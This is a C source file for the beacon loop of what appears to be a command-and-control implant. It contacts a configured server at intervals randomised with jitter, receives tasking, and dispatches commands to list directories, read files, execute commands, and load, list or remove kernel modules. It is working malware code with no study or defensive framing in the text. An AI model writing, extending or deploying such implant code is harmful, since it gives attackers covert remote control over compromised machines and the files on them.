#include "beacon.h"
#include "debug.h"
#include "common.h"
#include "packet.h"
#include "packet_parser.h"
#include "command.h"

static int calc_jitter(int baseTime, float jitterPercent)
{
	// Multiply the percentage by the baseTime to get the jitter range.
	int jitterRange = 0;

	jitterRange = baseTime * jitterPercent;
	if (jitterRange == 0)
		return 0;

	// Determine if the jitter will be positive or negative.
	if (rand() > RAND_MAX / 2)
	{
		return rand() % jitterRange; // make it positive
	}
	else
	{
		return -(rand() % jitterRange); // make it negative
	}
}

void *beacon(BEACONINFO *beaconInfo)
{
	int beaconInterval = 0;
	int jitterVal = 0;
	float percentVariance;

	DLX(5, printf("\nStarting beacon with the following parameters:\n"));
	DLX(5, printf("\t%32s: %-s\n", "Beacon Server", beaconInfo->host));
	DLX(5, printf("\t%32s: %-d\n", "Beacon Server Port", beaconInfo->port));
	DLX(5, printf("\t%32s: %-u\n", "Initial Beacon Delay (sec)", beaconInfo->initDelay));
	DLX(5, printf("\t%32s: %-i\n", "Beacon Interval (sec)", beaconInfo->interval));
	DLX(5, printf("\t%32s: %-d\n\n", "Beacon jitter", beaconInfo->jitter));

	{ // Determine the initial beacon delay
		unsigned int initial_beacon_delay;

		percentVariance = beaconInfo->jitter * 0.01f;

		initial_beacon_delay = percentVariance > 0 ? beaconInfo->initDelay + calc_jitter(beaconInfo->initDelay, percentVariance) : beaconInfo->initDelay;

		DLX(5, printf("\nStarting beacon with initial beacon delay of %d seconds\n", initial_beacon_delay));
		sleep(initial_beacon_delay);
	}
	for (;;)
	{
		percentVariance = beaconInfo->jitter * 0.01f;
		if (percentVariance > 0)
		{
			DLX(5, printf("\tVariance = %f\n", percentVariance));
			jitterVal = calc_jitter(beaconInfo->interval, percentVariance); // Get jitter and calculate new interval
			DLX(5, printf("\tJitterValue = %d\n", jitterVal));
			beaconInterval = beaconInfo->interval + jitterVal;
			DLX(5, printf("\tBeacon Interval = %d\n", beaconInterval));
		}
		else
		{
			beaconInterval = beaconInfo->interval;
		}

		// do jobs
		uint32_t command_id;
		struct packet_parser_struct parser = {0};
		void *data = NULL;
		uint32_t size = 0;

		packet_transmit_all(beaconInfo, &data, &size);
		if (data == NULL || size == 0)
			goto sleep;

		packet_parser_new(&parser, data, size);

		while ((command_id = packet_parser_get_uint32(&parser)) != 0)
		{
			switch (command_id)
			{
			case COMMAND_NO_JOB:
				DLX(2, printf("\tcommand no job \n"));
				break;
			case COMMAND_LS:
				handle_ls(beaconInfo, &parser);
				break;
			case COMMAND_CAT:
				handle_cat(beaconInfo, &parser);
				break;
			case COMMAND_INSMOD:
				handle_insmod(beaconInfo, &parser);
				break;
			case COMMAND_EXEC:
				handle_exec(beaconInfo, &parser);
				break;
			case COMMAND_LSMOD:
				handle_lsmod(beaconInfo,&parser);
				break;
			case COMMAND_MODINFO:
				handle_modinfo(beaconInfo,&parser);
				break;
			case COMMAND_RMMOD:
				handle_rmmod(beaconInfo,&parser);
				break;
			case COMMAND_USEMOD:
				handle_usemod(beaconInfo,&parser);
				break;
			default:
				DLX(2, printf("\tunknow command %d\n", command_id));
				break;
			}
		}

		packet_parser_destroy(&parser);
		free(data);
	sleep:
		DLX(5, printf("\tSending next beacon in %d seconds.\n", beaconInterval));
		sleep(beaconInterval); // Sleep for the length of the interval
	}
}